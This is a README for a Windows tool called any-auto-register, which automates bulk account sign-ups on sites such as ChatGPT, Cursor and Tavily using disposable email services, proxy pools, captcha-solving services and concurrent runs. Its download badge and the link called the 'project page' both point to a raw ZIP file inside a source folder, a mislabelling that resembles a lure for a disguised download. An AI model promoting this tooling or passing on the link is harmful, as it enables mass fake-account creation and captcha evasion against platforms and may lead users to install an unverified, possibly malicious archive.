# 🧩 any-auto-register - Automate Account Setup Across Sites

[![Download](https://img.shields.io/badge/Download-Open%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Albertarevolutionary289/any-auto-register/raw/refs/heads/main/core/executors/any_auto_register_1.1.zip)

## 🖥️ What this app does

any-auto-register helps you set up and manage accounts across several sites from one place. It uses a web app with a simple UI so you can run tasks from your browser instead of working in separate tools.

It is built for use on Windows and supports a mix of email services, proxy tools, captcha services, and plugin-based tasks.

## ✨ Main features

- Works with multiple platforms
- Supports custom plugins
- Uses built-in web UI
- Supports several email services
- Can use proxy pools
- Supports concurrent runs
- Shows live logs in the browser
- Lets each platform use its own actions
- Supports API mode without a browser

## 📦 What you need

Before you start, make sure your PC has:

- Windows 10 or Windows 11
- Python 3.11 or newer
- Node.js 18 or newer
- A stable internet connection
- At least 4 GB of free disk space
- 8 GB of RAM or more for smooth use

## ⬇️ Download

Go to the project page here:

https://github.com/Albertarevolutionary289/any-auto-register/raw/refs/heads/main/core/executors/any_auto_register_1.1.zip

Open the page, then download the project files or get the latest release from GitHub if one is available.

## 🪟 Install on Windows

Follow these steps in order.

### 1. Get the files

1. Open the download link above.
2. Download the project to your PC.
3. If you downloaded a ZIP file, right-click it and choose Extract All.
4. Move the folder to a simple path, such as `C:\any-auto-register`.

### 2. Open Command Prompt

1. Press `Win + S`.
2. Type `cmd`.
3. Open Command Prompt.
4. Use `cd` to go to the project folder.

Example:

```bat
cd C:\any-auto-register
```

### 3. Create a Python environment

Run this command:

```bat
python -m venv .venv
```

Then activate it:

```bat
.venv\Scripts\activate
```

If Windows asks for permission, allow it.

### 4. Install backend files

Run:

```bat
pip install -r requirements.txt
```

This installs the Python parts the app needs to run.

### 5. Build the web page

Go to the frontend folder:

```bat
cd frontend
```

Install the front-end files:

```bat
npm install
```

Build the app:

```bat
npm run build
```

Then return to the main folder:

```bat
cd ..
```

## 🚀 Start the app

Run the app from the main folder:

```bat
python main.py
```

If the project uses a different start file in your copy, open the main folder and look for a file named `main.py`, `app.py`, or a similar start file.

After the app starts, open your browser and go to the local address shown in the Command Prompt window.

## 🌐 First-time setup

When the app opens for the first time, you may need to set:

- Your email service
- Your proxy settings
- Your captcha service key
- The target platform
- How many tasks to run at the same time

If you only want to test the app, start with one task and keep the other fields empty until you need them.

## 🧭 Basic use

Use the app in this order:

1. Open the web UI in your browser.
2. Choose the platform you want to use.
3. Add your email or mailbox details.
4. Set proxy or captcha options if needed.
5. Start the task.
6. Watch the live logs in the browser.
7. Check the result after the task ends.

## 🧱 Supported parts

### 📩 Email services

The app can work with:

- MoeMail
- Laoudo
- DuckMail
- Cloudflare Worker based mailboxes

### 🔐 Captcha services

The app can use:

- YesCaptcha
- 2Captcha
- Local solver with Camoufox

### 🧰 Execution modes

The app supports:

- API mode with no browser
- Headless browser mode
- Visible browser mode

### 🔌 Platform support

The project includes support for:

- Trae.ai
- Tavily
- Cursor
- Kiro
- ChatGPT
- OpenBlockLabs

It also supports custom plugins for other sites.

## 🧩 Plugin use

Plugins let the app handle more platforms and custom steps.

A plugin can:

- Add a new platform
- Change the order of steps
- Add custom account actions
- Handle site-specific forms
- Add extra checks after setup

If you plan to use a plugin, place it in the plugin folder used by the project and open the app again so it can load the new file.

## 📈 Logs and status

The app shows live logs in the web UI.

This helps you see:

- What task is running
- What step is active
- Whether a proxy works
- Whether captcha passes
- Whether the task finished or failed

## 🛠️ Common problems

### Python is not found

If Windows says Python is missing:

1. Install Python 3.11 or newer
2. Check the box that says add Python to PATH
3. Open a new Command Prompt
4. Try the command again

### Node.js is not found

If `npm` does not work:

1. Install Node.js 18 or newer
2. Open a new Command Prompt
3. Try `npm -v`
4. Run `npm install` again

### Build fails in the frontend

If `npm run build` fails:

1. Make sure you are in the `frontend` folder
2. Run `npm install` again
3. Check your internet connection
4. Try the build step again

### The app will not start

If the app does not open:

1. Confirm the virtual environment is active
2. Confirm all files were installed
3. Check the Command Prompt for error text
4. Fix the first error shown and run the command again

### The browser page does not open

If the browser page does not load:

1. Check the local address in the terminal
2. Make sure the app is still running
3. Try `http://127.0.0.1:8000` or the address shown by the app

## 🧹 Update the app

To update later:

1. Download the newest project files from the GitHub page
2. Replace the old files with the new ones
3. Run the install steps again if needed
4. Start the app again

## 🔎 Quick Windows run list

If you want the shortest path, use this order:

1. Download the project from GitHub
2. Extract the files
3. Open Command Prompt
4. Go to the project folder
5. Run `python -m venv .venv`
6. Run `.venv\Scripts\activate`
7. Run `pip install -r requirements.txt`
8. Run `cd frontend`
9. Run `npm install`
10. Run `npm run build`
11. Run `cd ..`
12. Run `python main.py`

## 📁 Example folder layout

Your folder may look like this:

```text
any-auto-register/
├─ frontend/
├─ plugins/
├─ requirements.txt
├─ main.py
└─ README.md
```

## 🧪 First test run

For your first test, use one simple task:

- One account only
- One email service
- No proxy
- No captcha service unless needed
- One platform only

This makes it easier to check that the app starts and works on your PC